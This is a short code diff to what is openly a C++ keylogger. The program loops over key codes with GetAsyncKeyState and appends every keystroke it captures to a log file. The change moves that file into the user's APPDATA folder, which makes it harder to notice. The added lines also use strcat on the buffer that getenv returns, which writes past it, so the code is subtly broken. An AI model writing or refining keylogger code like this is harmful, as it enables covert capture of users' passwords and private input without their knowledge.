@@ -96,6 +96,8 @@ char filter_char(char key){
 
 void log(){
     char key;
+    char* appdata = getenv("APPDATA");
+    strcat(appdata,"\\log.txt");
 
     for(;;){
         // sleep(0);
@@ -103,7 +105,7 @@ void log(){
         for(key=8;key<=222;key++){
             //getasynckeystate function is a system interrupt which checks whether the user has entered the a keystroke
             if(GetAsyncKeyState(key) == -32767){
-                ofstream write ("log.txt", ios::app);
+                ofstream write (appdata, ios::app);
                 // write << c;
                 switch(key){
                     case 8: write<<"<BackSpace>";
